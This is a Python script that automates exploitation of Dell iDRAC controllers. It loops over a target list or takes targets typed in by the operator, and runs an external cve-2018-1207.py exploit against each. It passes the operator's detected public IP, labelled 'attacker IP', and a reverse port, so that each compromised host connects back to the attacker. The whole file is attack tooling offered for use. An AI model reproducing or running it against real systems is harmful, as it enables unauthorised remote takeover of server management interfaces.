import os
import subprocess
import requests

def get_public_ip():
    try:
        ip = requests.get("https://api.ipify.org", timeout=5).text.strip()
        print(f"[+] Detected attacker IP: {ip}")
        return ip
    except:
        print("[✗] Failed to detect public IP.")
        return None

def run_exploit(ip, port, attacker_ip, reverse_port=9000):
    print(f"\n[>] Running exploit against {ip}:{port} from {attacker_ip}:{reverse_port}")

    try:
        result = subprocess.check_output(
            ["python3", "cve-2018-1207.py", ip, str(port), attacker_ip, str(reverse_port)],
            stderr=subprocess.STDOUT,
            text=True
        )

        print(result)

        if "vulnerable" in result and "Good luck!" in result:
            print(f"[✓] Exploit likely succeeded on {ip}. Payload uploaded.")
            return True
        else:
            print(f"[✗] Target {ip} not vulnerable or payload failed.")
            return False

    except subprocess.CalledProcessError as e:
        print(f"[!] Error on {ip}:\n{e.output.strip()}")
        return False

def main():
    attacker_ip = get_public_ip()
    if not attacker_ip:
        return

    use_list = input("Are you using IP list? [y/n]: ").strip().lower()

    if use_list == 'y':
        try:
            with open("ip_list.txt") as f:
                targets = [line.strip() for line in f if line.strip()]
        except FileNotFoundError:
            print("[✗] ip_list.txt not found.")
            return

        for ip in targets:
            success = run_exploit(ip, 443, attacker_ip)
            if success:
                break
            else:
                print("[↻] Trying next IP...")

    else:
        while True:
            ip = input("Enter iDRAC IP: ").strip()
            port_input = input("Enter port (default 443): ").strip()
            port = int(port_input) if port_input else 443

            success = run_exploit(ip, port, attacker_ip)
            if success:
                break
            else:
                print("[↻] Try again with another IP.")
                
if __name__ == "__main__":
    main()
